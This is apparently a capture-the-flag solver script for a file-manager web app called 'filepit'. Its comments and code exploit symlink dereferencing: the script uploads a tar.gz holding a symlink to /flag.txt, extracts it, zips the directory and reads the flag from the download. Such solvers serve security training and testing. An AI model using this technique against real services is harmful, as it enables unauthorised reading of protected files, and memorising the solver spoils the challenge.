import io
import os
import tarfile
import zipfile

import requests

HOST = os.environ.get("SERVICE_PIT_HTTP_HOST", "127.0.0.1")
PORT = os.environ.get("SERVICE_PIT_HTTP_PORT", "3000")
BASE_URL = f"http://{HOST}:{PORT}"

# Built from scratch (no author checker).
#
# "filepit" is a small file-manager app; the real FLAG is written to
# /flag.txt at container startup, outside the managed files directory
# (BASE_DIR=/files). Every path-accepting endpoint runs the same
# validate_path(): it resolves the path (following symlinks!) and
# checks the RESULT is still inside BASE_DIR -- which blocks directly
# reading a symlink that points outside (e.g. GET /download?path=steal
# where steal -> /flag.txt returns "Invalid path", since .resolve()
# follows the link before the containment check runs).
#
# But /archive shells out to plain `zip -r <archive> <name>` with no
# -y flag -- Info-ZIP's default behavior is to DEREFERENCE symlinks
# it encounters while recursing, storing the real target file's
# content directly in the resulting archive. So the actual exploit
# never needs validate_path to accept the symlink's own path at all:
#   1. Upload a tar.gz containing a symlink entry ("steal" -> /flag.txt).
#   2. POST /extract it into a subdirectory we create -- the symlink
#      itself lands safely *inside* BASE_DIR (extract only validates
#      the destination directory, not what gets planted inside it).
#   3. POST /archive on that subdirectory (fmt=zip) -- zip recurses in,
#      follows the symlink, and bundles the real /flag.txt bytes.
#   4. Download the resulting <subdir>.zip (a sibling to the
#      subdirectory, so still safely inside BASE_DIR) and read the
#      dereferenced file out of it.


def make_symlink_tar(link_name: str, target_path: str) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        info = tarfile.TarInfo(name=link_name)
        info.type = tarfile.SYMTYPE
        info.linkname = target_path
        tar.addfile(info)
    return buf.getvalue()


def main():
    s = requests.Session()

    r = s.post(f"{BASE_URL}/mkdir", data={"path": "", "name": "stuff"})
    r.raise_for_status()

    evil_tar = make_symlink_tar("steal", "/flag.txt")
    r = s.post(
        f"{BASE_URL}/upload",
        data={"path": ""},
        files={"file": ("evil.tar.gz", evil_tar, "application/gzip")},
    )
    r.raise_for_status()

    r = s.post(f"{BASE_URL}/extract", params={"path": "evil.tar.gz"}, data={"dest": "stuff"})
    r.raise_for_status()

    r = s.post(f"{BASE_URL}/archive", params={"path": "stuff"}, data={"fmt": "zip"})
    r.raise_for_status()

    r = s.get(f"{BASE_URL}/download", params={"path": "stuff.zip"})
    r.raise_for_status()

    with zipfile.ZipFile(io.BytesIO(r.content)) as zf:
        flag = zf.read("stuff/steal").decode()

    print(flag)

    flag_env = os.environ.get("flag_flag")
    if flag_env and flag_env not in flag:
        raise SystemExit(f"flag mismatch: expected {flag_env!r} to be in {flag!r}")


if __name__ == "__main__":
    main()
